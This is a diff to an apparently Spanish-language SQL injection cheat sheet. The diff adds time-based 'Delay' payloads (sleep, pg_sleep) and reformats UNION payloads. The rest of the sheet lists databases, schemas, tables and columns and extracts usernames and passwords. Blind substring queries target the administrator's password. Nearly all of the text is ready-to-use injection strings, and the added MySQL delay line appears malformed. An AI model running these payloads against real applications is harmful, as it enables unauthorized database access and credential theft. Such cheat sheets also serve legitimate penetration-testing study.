@@ -49,6 +49,10 @@ En este documento recogemos las principales consultas de enumeración y extracci
 ' and (select substring(username,1,1) from users where username='administrator' and length(password)=20) = 'a'-- -
 ```
 
+## Delay
+```SQL
+' and select sleep(10)-- -
+```
 
 ## Condición booleana 
 ```SQL
@@ -65,32 +69,32 @@ En este documento recogemos las principales consultas de enumeración y extracci
 
 ## Listar bases de datos
 ```sql
-' UNION SELECT datname, NULL FROM pg_database -- 
+' UNION SELECT datname, NULL FROM pg_database-- 
 ```
 
 ## Listar schemas en la base de datos actual
 ```sql
-' UNION SELECT NULL, schema_name FROM information_schema.schemata -- 
+' UNION SELECT NULL, schema_name FROM information_schema.schemata-- 
 ```
 
 ## Listar tablas de un esquema
 ```sql
-' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = 'public' -- 
+' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = 'public'-- 
 ```
 
 ## Listar columnas
 ```sql
-' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name = 'nombre_tabla' -- 
+' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name = 'nombre_tabla'-- 
 ```
 
 ## Extraer datos
 ```sql
-' UNION SELECT username, password FROM users -- 
+' UNION SELECT username, password FROM users-- 
 ```
 
 ## Paginación
 ```sql
-' UNION SELECT NULL, col FROM tabla LIMIT 10 OFFSET 0 -- 
+' UNION SELECT NULL, col FROM tabla LIMIT 10 OFFSET 0-- 
 ```
 
 ## Longitud
@@ -98,6 +102,10 @@ En este documento recogemos las principales consultas de enumeración y extracci
 ' and (select substr(password,1,1) from users where username='administrator' and length(password)=20) = 'a'-- -
 ```
 
+## Delay
+```SQL
+' || pg_sleep(10)-- -
+```
 
 ## Condición booleana
 ```SQL
